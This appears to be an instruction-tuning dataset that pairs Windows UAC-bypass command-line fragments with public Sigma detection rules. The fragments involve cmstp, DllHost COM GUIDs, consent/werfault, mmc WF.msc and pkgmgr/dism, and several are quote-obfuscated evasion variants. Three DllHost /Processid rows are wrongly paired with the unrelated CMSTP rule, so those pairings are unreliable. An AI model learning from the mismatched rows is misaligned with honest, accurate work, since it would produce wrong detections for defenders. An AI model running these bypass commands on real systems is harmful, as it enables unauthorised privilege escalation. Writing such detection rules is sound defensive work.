{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmstp.exe CMSTP.EXE /s -s /au \"-au\" /ni -ni", "output": "title: Bypass UAC via CMSTP\nid: e66779cc-383e-4224-a3a4-267eeb585c40\nstatus: test\ndescription: Detect commandline usage of Microsoft Connection Manager Profile Installer (cmstp.exe) to install specially formatted local .INF files\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/e584f1a1-c303-4885-8a66-21360c90995b.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.003/T1218.003.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Cmstp/\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2022-08-30\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\n    - attack.t1218.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmstp.exe'\n        - OriginalFileName: 'CMSTP.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - '/s'\n            - '-s'\n            - '/au'\n            - '-au'\n            - '/ni'\n            - '-ni'\n    condition: all of selection*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate use of cmstp.exe utility by legitimate user\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmstp CMSTP /s -s /au -au /ni -ni", "output": "title: Bypass UAC via CMSTP\nid: e66779cc-383e-4224-a3a4-267eeb585c40\nstatus: test\ndescription: Detect commandline usage of Microsoft Connection Manager Profile Installer (cmstp.exe) to install specially formatted local .INF files\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/e584f1a1-c303-4885-8a66-21360c90995b.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.003/T1218.003.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Cmstp/\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2022-08-30\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\n    - attack.t1218.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmstp.exe'\n        - OriginalFileName: 'CMSTP.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - '/s'\n            - '-s'\n            - '/au'\n            - '-au'\n            - '/ni'\n            - '-ni'\n    condition: all of selection*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate use of cmstp.exe utility by legitimate user\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmstp.exe CMSTP.EXE /s -s /au -au /ni -ni", "output": "title: Bypass UAC via CMSTP\nid: e66779cc-383e-4224-a3a4-267eeb585c40\nstatus: test\ndescription: Detect commandline usage of Microsoft Connection Manager Profile Installer (cmstp.exe) to install specially formatted local .INF files\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/e584f1a1-c303-4885-8a66-21360c90995b.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.003/T1218.003.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Cmstp/\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2022-08-30\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\n    - attack.t1218.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmstp.exe'\n        - OriginalFileName: 'CMSTP.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - '/s'\n            - '-s'\n            - '/au'\n            - '-au'\n            - '/ni'\n            - '-ni'\n    condition: all of selection*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate use of cmstp.exe utility by legitimate user\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7} /Processid:{3E000D72-A845-4CD9-BD83-80C07C3B881F} /Processid:{BD54C901-076B-434E-B6C7-17C531F4AB41} /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937} /Processid:{E9495B87-D950-4AB5-87A5-FF6D70BF3E90}", "output": "title: Bypass UAC via CMSTP\nid: e66779cc-383e-4224-a3a4-267eeb585c40\nstatus: test\ndescription: Detect commandline usage of Microsoft Connection Manager Profile Installer (cmstp.exe) to install specially formatted local .INF files\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/e584f1a1-c303-4885-8a66-21360c90995b.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.003/T1218.003.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Cmstp/\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2022-08-30\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\n    - attack.t1218.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmstp.exe'\n        - OriginalFileName: 'CMSTP.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - '/s'\n            - '-s'\n            - '/au'\n            - '-au'\n            - '/ni'\n            - '-ni'\n    condition: all of selection*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate use of cmstp.exe utility by legitimate user\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DllHost /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7} /Processid:{3E000D72-A845-4CD9-BD83-80C07C3B881F} /Processid:{BD54C901-076B-434E-B6C7-17C531F4AB41} /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937} /Processid:{E9495B87-D950-4AB5-87A5-FF6D70BF3E90}", "output": "title: Bypass UAC via CMSTP\nid: e66779cc-383e-4224-a3a4-267eeb585c40\nstatus: test\ndescription: Detect commandline usage of Microsoft Connection Manager Profile Installer (cmstp.exe) to install specially formatted local .INF files\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/e584f1a1-c303-4885-8a66-21360c90995b.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.003/T1218.003.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Cmstp/\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2022-08-30\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\n    - attack.t1218.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmstp.exe'\n        - OriginalFileName: 'CMSTP.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - '/s'\n            - '-s'\n            - '/au'\n            - '-au'\n            - '/ni'\n            - '-ni'\n    condition: all of selection*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate use of cmstp.exe utility by legitimate user\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7} /Processid:{3E000D72-A845-4CD9-BD83-80C07C3B881F} /Processid:{BD54C901-076B-434E-B6C7-17C531F4AB41} /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937} /Processid:{E9495B87-D950-4AB5-87A5-FF6D70BF3E90}", "output": "title: Bypass UAC via CMSTP\nid: e66779cc-383e-4224-a3a4-267eeb585c40\nstatus: test\ndescription: Detect commandline usage of Microsoft Connection Manager Profile Installer (cmstp.exe) to install specially formatted local .INF files\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/e584f1a1-c303-4885-8a66-21360c90995b.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.003/T1218.003.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Cmstp/\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2022-08-30\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\n    - attack.t1218.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmstp.exe'\n        - OriginalFileName: 'CMSTP.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - '/s'\n            - '-s'\n            - '/au'\n            - '-au'\n            - '/ni'\n            - '-ni'\n    condition: all of selection*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate use of cmstp.exe utility by legitimate user\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\consent.exe \\werfault.exe", "output": "title: UAC Bypass Using Consent and Comctl32 - Process\nid: 1ca6bd18-0ba0-44ca-851c-92ed89a61085\nstatus: test\ndescription: Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22)\nreferences:\n    - https://github.com/hfiref0x/UACME\nauthor: Christian Burkard (Nextron Systems)\ndate: 2021-08-23\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\consent.exe'\n        Image|endswith: '\\werfault.exe'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n            - 'S-1-16-16384' # System\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\consent.exe \\werfa\"ult.exe\"", "output": "title: UAC Bypass Using Consent and Comctl32 - Process\nid: 1ca6bd18-0ba0-44ca-851c-92ed89a61085\nstatus: test\ndescription: Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22)\nreferences:\n    - https://github.com/hfiref0x/UACME\nauthor: Christian Burkard (Nextron Systems)\ndate: 2021-08-23\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\consent.exe'\n        Image|endswith: '\\werfault.exe'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n            - 'S-1-16-16384' # System\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\consent \\werfault", "output": "title: UAC Bypass Using Consent and Comctl32 - Process\nid: 1ca6bd18-0ba0-44ca-851c-92ed89a61085\nstatus: test\ndescription: Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22)\nreferences:\n    - https://github.com/hfiref0x/UACME\nauthor: Christian Burkard (Nextron Systems)\ndate: 2021-08-23\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\consent.exe'\n        Image|endswith: '\\werfault.exe'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n            - 'S-1-16-16384' # System\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\consent.exe \\werfault.exe", "output": "title: UAC Bypass Using Consent and Comctl32 - Process\nid: 1ca6bd18-0ba0-44ca-851c-92ed89a61085\nstatus: test\ndescription: Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22)\nreferences:\n    - https://github.com/hfiref0x/UACME\nauthor: Christian Burkard (Nextron Systems)\ndate: 2021-08-23\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\consent.exe'\n        Image|endswith: '\\werfault.exe'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n            - 'S-1-16-16384' # System\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\mmc.exe WF.msc \\WerFault.exe", "output": "title: UAC Bypass via Windows Firewall Snap-In Hijack\nid: e52cb31c-10ed-4aea-bcb7-593c9f4a315b\nstatus: test\ndescription: Detects attempts to bypass User Account Control (UAC) by hijacking the Microsoft Management Console (MMC) Windows Firewall snap-in\nreferences:\n    - https://www.elastic.co/guide/en/security/current/uac-bypass-via-windows-firewall-snap-in-hijack.html#uac-bypass-via-windows-firewall-snap-in-hijack\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-27\ntags:\n    - attack.privilege-escalation\n    - attack.t1548\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\mmc.exe'\n        ParentCommandLine|contains: 'WF.msc'\n    filter:\n        Image|endswith: '\\WerFault.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\mmc.exe WF.msc \\\"\\WerFault.exe\\\"", "output": "title: UAC Bypass via Windows Firewall Snap-In Hijack\nid: e52cb31c-10ed-4aea-bcb7-593c9f4a315b\nstatus: test\ndescription: Detects attempts to bypass User Account Control (UAC) by hijacking the Microsoft Management Console (MMC) Windows Firewall snap-in\nreferences:\n    - https://www.elastic.co/guide/en/security/current/uac-bypass-via-windows-firewall-snap-in-hijack.html#uac-bypass-via-windows-firewall-snap-in-hijack\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-27\ntags:\n    - attack.privilege-escalation\n    - attack.t1548\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\mmc.exe'\n        ParentCommandLine|contains: 'WF.msc'\n    filter:\n        Image|endswith: '\\WerFault.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\mmc WF.msc \\WerFault", "output": "title: UAC Bypass via Windows Firewall Snap-In Hijack\nid: e52cb31c-10ed-4aea-bcb7-593c9f4a315b\nstatus: test\ndescription: Detects attempts to bypass User Account Control (UAC) by hijacking the Microsoft Management Console (MMC) Windows Firewall snap-in\nreferences:\n    - https://www.elastic.co/guide/en/security/current/uac-bypass-via-windows-firewall-snap-in-hijack.html#uac-bypass-via-windows-firewall-snap-in-hijack\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-27\ntags:\n    - attack.privilege-escalation\n    - attack.t1548\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\mmc.exe'\n        ParentCommandLine|contains: 'WF.msc'\n    filter:\n        Image|endswith: '\\WerFault.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\mmc.exe \\WerFault.exe WF.msc", "output": "title: UAC Bypass via Windows Firewall Snap-In Hijack\nid: e52cb31c-10ed-4aea-bcb7-593c9f4a315b\nstatus: test\ndescription: Detects attempts to bypass User Account Control (UAC) by hijacking the Microsoft Management Console (MMC) Windows Firewall snap-in\nreferences:\n    - https://www.elastic.co/guide/en/security/current/uac-bypass-via-windows-firewall-snap-in-hijack.html#uac-bypass-via-windows-firewall-snap-in-hijack\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-27\ntags:\n    - attack.privilege-escalation\n    - attack.t1548\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\mmc.exe'\n        ParentCommandLine|contains: 'WF.msc'\n    filter:\n        Image|endswith: '\\WerFault.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dllhost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7} /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937} \\WerFault.exe WerFault.exe", "output": "title: UAC Bypass via ICMLuaUtil\nid: 49f2f17b-b4c8-4172-a68b-d5bf95d05130\nstatus: test\ndescription: Detects the pattern of UAC Bypass using ICMLuaUtil Elevated COM interface\nreferences:\n    - https://www.elastic.co/guide/en/security/current/uac-bypass-via-icmluautil-elevated-com-interface.html\nauthor: Florian Roth (Nextron Systems), Elastic (idea)\ndate: 2022-09-13\nmodified: 2022-09-27\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\dllhost.exe'\n        ParentCommandLine|contains:\n            - '/Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}'\n            - '/Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}'\n    filter:\n        - Image|endswith: '\\WerFault.exe'\n        - OriginalFileName: 'WerFault.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dllhost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7} /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937} \\\"\\\\\"\\\"W\\\"\\\"e\\\"\\\"r\\\"\\\"F\\\"\\\"a\\\"\\\"u\\\"\\\"l\\\"\\\"t\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\" WerFault.exe", "output": "title: UAC Bypass via ICMLuaUtil\nid: 49f2f17b-b4c8-4172-a68b-d5bf95d05130\nstatus: test\ndescription: Detects the pattern of UAC Bypass using ICMLuaUtil Elevated COM interface\nreferences:\n    - https://www.elastic.co/guide/en/security/current/uac-bypass-via-icmluautil-elevated-com-interface.html\nauthor: Florian Roth (Nextron Systems), Elastic (idea)\ndate: 2022-09-13\nmodified: 2022-09-27\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\dllhost.exe'\n        ParentCommandLine|contains:\n            - '/Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}'\n            - '/Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}'\n    filter:\n        - Image|endswith: '\\WerFault.exe'\n        - OriginalFileName: 'WerFault.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dllhost /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7} /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937} \\WerFault WerFault", "output": "title: UAC Bypass via ICMLuaUtil\nid: 49f2f17b-b4c8-4172-a68b-d5bf95d05130\nstatus: test\ndescription: Detects the pattern of UAC Bypass using ICMLuaUtil Elevated COM interface\nreferences:\n    - https://www.elastic.co/guide/en/security/current/uac-bypass-via-icmluautil-elevated-com-interface.html\nauthor: Florian Roth (Nextron Systems), Elastic (idea)\ndate: 2022-09-13\nmodified: 2022-09-27\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\dllhost.exe'\n        ParentCommandLine|contains:\n            - '/Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}'\n            - '/Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}'\n    filter:\n        - Image|endswith: '\\WerFault.exe'\n        - OriginalFileName: 'WerFault.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dllhost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7} /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937} \\WerFault.exe WerFault.exe", "output": "title: UAC Bypass via ICMLuaUtil\nid: 49f2f17b-b4c8-4172-a68b-d5bf95d05130\nstatus: test\ndescription: Detects the pattern of UAC Bypass using ICMLuaUtil Elevated COM interface\nreferences:\n    - https://www.elastic.co/guide/en/security/current/uac-bypass-via-icmluautil-elevated-com-interface.html\nauthor: Florian Roth (Nextron Systems), Elastic (idea)\ndate: 2022-09-13\nmodified: 2022-09-27\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\dllhost.exe'\n        ParentCommandLine|contains:\n            - '/Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}'\n            - '/Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}'\n    filter:\n        - Image|endswith: '\\WerFault.exe'\n        - OriginalFileName: 'WerFault.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DllHost.exe /Processid:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}", "output": "title: UAC Bypass Using IDiagnostic Profile\nid: 4cbef972-f347-4170-b62a-8253f6168e6d\nstatus: test\ndescription: Detects the \"IDiagnosticProfileUAC\" UAC bypass technique\nreferences:\n    - https://github.com/Wh04m1001/IDiagnosticProfileUAC\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-03\nmodified: 2024-12-01\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\DllHost.exe'\n        ParentCommandLine|contains: ' /Processid:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n            - 'S-1-16-16384' # System\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DllHost.exe /\"P\"\"r\"\"o\"\"c\"\"e\"\"s\"\"s\"\"i\"\"d\"\":\"\"{\"\"1\"\"2\"\"C\"\"2\"\"1\"\"E\"\"A\"\"7\"\"-\"\"2\"\"E\"\"B\"\"8\"\"-\"\"4\"\"B\"\"5\"\"5\"\"-\"\"9\"\"2\"\"4\"\"9\"\"-\"\"A\"\"C\"\"2\"\"4\"\"3\"\"D\"\"A\"\"8\"\"C\"\"6\"\"6\"\"6\"\"}\"", "output": "title: UAC Bypass Using IDiagnostic Profile\nid: 4cbef972-f347-4170-b62a-8253f6168e6d\nstatus: test\ndescription: Detects the \"IDiagnosticProfileUAC\" UAC bypass technique\nreferences:\n    - https://github.com/Wh04m1001/IDiagnosticProfileUAC\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-03\nmodified: 2024-12-01\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\DllHost.exe'\n        ParentCommandLine|contains: ' /Processid:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n            - 'S-1-16-16384' # System\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DllHost /Processid:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}", "output": "title: UAC Bypass Using IDiagnostic Profile\nid: 4cbef972-f347-4170-b62a-8253f6168e6d\nstatus: test\ndescription: Detects the \"IDiagnosticProfileUAC\" UAC bypass technique\nreferences:\n    - https://github.com/Wh04m1001/IDiagnosticProfileUAC\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-03\nmodified: 2024-12-01\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\DllHost.exe'\n        ParentCommandLine|contains: ' /Processid:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n            - 'S-1-16-16384' # System\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DllHost.exe /Processid:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}", "output": "title: UAC Bypass Using IDiagnostic Profile\nid: 4cbef972-f347-4170-b62a-8253f6168e6d\nstatus: test\ndescription: Detects the \"IDiagnosticProfileUAC\" UAC bypass technique\nreferences:\n    - https://github.com/Wh04m1001/IDiagnosticProfileUAC\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-03\nmodified: 2024-12-01\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\DllHost.exe'\n        ParentCommandLine|contains: ' /Processid:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n            - 'S-1-16-16384' # System\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pkgmgr.exe \\dism.exe", "output": "title: UAC Bypass Using PkgMgr and DISM\nid: a743ceba-c771-4d75-97eb-8a90f7f4844c\nstatus: test\ndescription: Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe 23)\nreferences:\n    - https://github.com/hfiref0x/UACME\nauthor: Christian Burkard (Nextron Systems)\ndate: 2021-08-23\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\pkgmgr.exe'\n        Image|endswith: '\\dism.exe'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n            - 'S-1-16-16384' # System\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pkgmgr.exe \\dis\\\"m.exe\\\"", "output": "title: UAC Bypass Using PkgMgr and DISM\nid: a743ceba-c771-4d75-97eb-8a90f7f4844c\nstatus: test\ndescription: Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe 23)\nreferences:\n    - https://github.com/hfiref0x/UACME\nauthor: Christian Burkard (Nextron Systems)\ndate: 2021-08-23\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\pkgmgr.exe'\n        Image|endswith: '\\dism.exe'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n            - 'S-1-16-16384' # System\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pkgmgr \\dism", "output": "title: UAC Bypass Using PkgMgr and DISM\nid: a743ceba-c771-4d75-97eb-8a90f7f4844c\nstatus: test\ndescription: Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe 23)\nreferences:\n    - https://github.com/hfiref0x/UACME\nauthor: Christian Burkard (Nextron Systems)\ndate: 2021-08-23\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\pkgmgr.exe'\n        Image|endswith: '\\dism.exe'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n            - 'S-1-16-16384' # System\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pkgmgr.exe \\dism.exe", "output": "title: UAC Bypass Using PkgMgr and DISM\nid: a743ceba-c771-4d75-97eb-8a90f7f4844c\nstatus: test\ndescription: Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe 23)\nreferences:\n    - https://github.com/hfiref0x/UACME\nauthor: Christian Burkard (Nextron Systems)\ndate: 2021-08-23\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\pkgmgr.exe'\n        Image|endswith: '\\dism.exe'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n            - 'S-1-16-16384' # System\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
